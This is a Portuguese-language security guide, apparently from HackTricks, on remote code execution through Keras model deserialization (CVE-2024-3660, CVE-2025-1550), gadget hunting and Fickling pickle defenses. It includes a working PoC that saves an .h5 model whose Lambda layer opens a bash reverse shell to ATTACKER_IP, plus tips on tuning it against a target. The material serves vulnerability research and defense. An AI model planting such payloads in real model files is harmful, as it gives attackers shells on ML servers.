# RCE de Desserialização de Modelos Keras e Busca por Gadgets

{{#include ../../banners/hacktricks-training.md}}

Esta página resume técnicas práticas de exploração contra o pipeline de desserialização de modelos Keras, explica os componentes internos e a superfície de ataque do formato nativo `.keras` e fornece um toolkit para pesquisadores encontrarem Model File Vulnerabilities (MFVs) e gadgets pós-correção.

## Componentes internos do formato de modelo .keras

Um arquivo `.keras` é um arquivo ZIP contendo pelo menos:<sup>[[1]](#references)</sup>
- metadata.json – informações genéricas (por exemplo, versão do Keras)
- config.json – arquitetura do modelo (principal superfície de ataque)
- model.weights.h5 – pesos em HDF5

O config.json controla a desserialização recursiva: o Keras importa módulos, resolve classes/funções e reconstrói camadas/objetos a partir de dicionários controlados pelo atacante.<sup>[[1]](#references)</sup>

Exemplo de trecho para um objeto de camada Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
A desserialização executa:<sup>[[1]](#references)</sup>
- Importação de módulos e resolução de símbolos a partir das chaves module/class_name
- from_config(...) ou invocação do construtor com kwargs controlados pelo atacante
- Recursão em objetos aninhados (ativações, inicializadores, restrições etc.)

Historicamente, isso expunha três primitivas a um atacante que criasse o config.json:<sup>[[1]](#references)</sup>
- Controle sobre quais módulos são importados
- Controle sobre quais classes/funções são resolvidas
- Controle sobre os kwargs passados aos construtores/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Causa raiz:
- A desserialização legada de Lambda reconstruía uma função Python a partir de código marshal controlado pelo atacante: `func_load()` decodifica o payload em base64, chama `marshal.loads()` e cria um `FunctionType`. O bytecode da função resultante é executado quando o Lambda é invocado, e os loaders afetados anteriores à versão 2.13 não aplicavam verificações de safe-mode para formatos legados.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

Em um archive nativo do Keras v3, a função Lambda é representada como um objeto `__lambda__`, cujo campo `code` contém código marshal codificado em base64:<sup>[[17]](#references)[[18]](#references)</sup>
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"class_name": "__lambda__",
"config": {
"code": "<base64(marshal.dumps(function.__code__))>",
"defaults": null,
"closure": null
}
}
}
}
```
Mitigação:
- O Keras aplica `safe_mode=True` por padrão ao formato nativo Keras v3. Lambdas Python serializadas em `Lambda` são bloqueadas, a menos que o usuário opte explicitamente por desativar essa proteção com `safe_mode=False`; essa proteção não abrange formatos legados da mesma maneira.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Observações:
- Formatos legados (salvamentos HDF5 antigos) ou codebases mais antigos podem não aplicar verificações modernas; portanto, ataques no estilo “downgrade” ainda podem funcionar quando as vítimas usam loaders antigos.

## CVE-2025-1550 – Importação arbitrária de módulos no Keras 3.0.0–3.8.x

Causa raiz:
- `_retrieve_class_or_fn` usava `importlib.import_module(module)` em strings de módulos controladas pelo atacante, provenientes de `config.json`.
- Impacto: um arquivo `.keras` criado especialmente poderia fazer `Model.load_model()` importar módulos e funções Python escolhidos pelo atacante, com efeitos colaterais no momento da importação e argumentos controlados pelo atacante, mesmo com `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Ideia do exploit:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Melhorias de segurança (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Allowlist de módulos: imports restritos aos módulos oficiais do ecossistema: keras, keras_hub, keras_cv, keras_nlp
- Modo seguro por padrão: safe_mode=True bloqueia o carregamento inseguro de funções serializadas de Lambda
- Verificação básica de tipos: os objetos desserializados devem corresponder aos tipos esperados

## Exploração prática: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Deployments legados do TensorFlow-Keras ainda podem aceitar arquivos de modelo HDF5 (`.h5`). Se um atacante puder fazer upload de um modelo que o servidor posteriormente carregue ou use para executar inferência, um loader vulnerável poderá desserializar uma camada Lambda contendo Python controlado pelo atacante, que poderá então ser executado no workflow do modelo da aplicação.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

PoC mínimo para criar um .h5 malicioso cuja Lambda executa um reverse shell quando o alvo invoca o modelo:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Notas e dicas de confiabilidade:
- Os pontos de acionamento variam conforme o formato e o workflow; o write-up referenciado observou o payload sendo executado duas vezes durante a predição. Trate os efeitos colaterais como repetíveis e torne os payloads idempotentes.<sup>[[7]](#references)</sup>
- Fixação de versão: corresponda o TF/Keras/Python da vítima para evitar incompatibilidades de serialização. Por exemplo, crie artefatos usando Python 3.8 com TensorFlow 2.13.1 se esse for o ambiente usado pelo alvo.<sup>[[7]](#references)</sup>
- Replicação rápida do ambiente:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validação: um payload benigno como os.system("ping -c 1 YOUR_IP") ajuda a confirmar a execução (por exemplo, observando ICMP com tcpdump) antes de mudar para um reverse shell.<sup>[[7]](#references)</sup>

## Superfície de gadgets pós-correção dentro da allowlist

Mesmo com a allowlist de módulos do Keras e o safe mode, os callables permitidos podem expor efeitos colaterais. Por exemplo, `keras.utils.get_file` baixa uma URL e grava o arquivo no local de cache configurado, tornando-se um candidato para análise de gadgets.<sup>[[1]](#references)[[19]](#references)</sup>

Configuração candidata de Lambda (valide a assinatura da chamada em um teste controlado):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Limitação importante:
- `Lambda.call()` sempre passa a entrada do modelo como o primeiro argumento posicional e os `arguments` configurados como argumentos nomeados. Para `get_file`, esse valor posicional preenche `fname`; uma incompatibilidade entre tensor e path pode fazer esse candidato falhar antes de qualquer download, portanto ele não é um gadget garantidamente funcional.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## ML pickle import allowlisting para modelos de AI/ML (Fickling)

Muitos formatos de modelos de AI/ML (PyTorch `.pt`/`.pth`/`.ckpt`, artefatos do joblib/scikit-learn e outros formatos nativos do Python) incorporam dados Python pickle. O caminho legado do Keras Lambda acima usa bytecode de função marshalizado, portanto é um risco de deserialização separado. Os opcodes do pickle podem invocar comportamento controlado pelo atacante durante a deserialização, incluindo adulteração do modelo ou RCE, e scanners simples podem não detectar imports perigosos novos ou não listados.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Uma defesa prática fail-closed é interceptar o deserializador pickle do Python e permitir apenas um conjunto revisado de imports inofensivos relacionados a ML durante o unpickling. O Fickling, da Trail of Bits, implementa essa política e inclui uma allowlist de imports de ML selecionados a partir de milhares de pickles públicos do Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Modelo de segurança para imports “seguros” (intuições consolidadas a partir de pesquisas e da prática): os símbolos importados usados por um pickle devem, simultaneamente:<sup>[[8]](#references)</sup>
- Não executar código nem causar execução (sem objetos de código compilados/de código-fonte, execução de comandos shell, hooks etc.)
- Não obter/definir atributos ou itens arbitrários
- Não importar nem obter referências a outros objetos Python a partir da VM do pickle
- Não acionar nenhum deserializador secundário (por exemplo, marshal ou pickle aninhado), nem mesmo indiretamente

Ative as proteções do Fickling o mais cedo possível na inicialização do processo, para que quaisquer loads de pickle realizados por frameworks (`torch.load`, `joblib.load` etc.) sejam verificados:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Dicas operacionais:
- Você pode desativar/reativar temporariamente os hooks quando necessário:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Se um modelo reconhecidamente confiável for bloqueado, amplie a allowlist do seu ambiente após revisar os símbolos:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- O Fickling também expõe proteções genéricas de runtime se você preferir um controle mais granular:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() para impor verificações em todas as chamadas a pickle.load()
- with fickling.check_safety(): para enforcement com escopo definido
- fickling.load(path) / fickling.is_likely_safe(path) para verificações pontuais

- Prefira formatos de modelo que não sejam pickle quando possível (por exemplo, SafeTensors).<sup>[[15]](#references)</sup> Se precisar aceitar pickle, execute os loaders com least privilege, sem network egress, e imponha a allowlist.

Essa estratégia baseada primeiro na allowlist bloqueia comprovadamente caminhos comuns de exploração de ML usando pickle, mantendo alta compatibilidade. No benchmark da ToB, o Fickling identificou 100% dos arquivos maliciosos sintéticos e permitiu aproximadamente 99% dos arquivos limpos dos principais repositórios do Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Kit de ferramentas do pesquisador

1) Descoberta sistemática de gadgets em módulos permitidos

Enumere callables candidatos em keras, keras_nlp, keras_cv, keras_hub e priorize aqueles com efeitos colaterais em arquivos/rede/processos/ambiente.<sup>[[1]](#references)</sup>

<details>
<summary>Enumerar callables potencialmente perigosos nos módulos Keras presentes na allowlist</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Testes diretos de desserialização (nenhum arquivo .keras necessário)

Alimente desserializadores do Keras diretamente com dicionários criados para aprender os parâmetros aceitos e observar efeitos colaterais.<sup>[[1]](#references)</sup>
```python
import keras

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/x",
"cache_dir": "/tmp/keras-cache"
}
}
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```
3) Análise entre versões e formatos

Keras existe em múltiplas codebases/eras com diferentes guardrails e formatos:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, programado para exclusão)
- tf-keras: mantido separadamente
- Multi-backend Keras 3 (official): introduziu o .keras nativo

Repita os testes entre codebases e formatos (.keras vs legacy HDF5) para descobrir regressões ou guardrails ausentes.

## References

- [1] [Caçando vulnerabilidades na desserialização de modelos Keras (blog da huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Adicionadas verificações à serialização](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE por desserialização de Keras Lambda](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Importação arbitrária de módulos do Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [Relatório da huntr – importação arbitrária #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [Relatório da huntr – importação arbitrária #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – RCE de Lambda do TensorFlow .h5 até root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Blog da Trail of Bits – Novo scanner de arquivos pickle de AI/ML do Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Protegendo ambientes de AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Corpus de benchmark de scanning de pickle do Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Contexto dos ataques Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Projeto SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Camadas Lambda do Keras 2 permitem injeção arbitrária de código](https://kb.cert.org/vuls/id/253266)
- [17] [Código-fonte da camada Lambda do Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Código-fonte dos utilitários Python do Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [API `get_file` do Keras](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
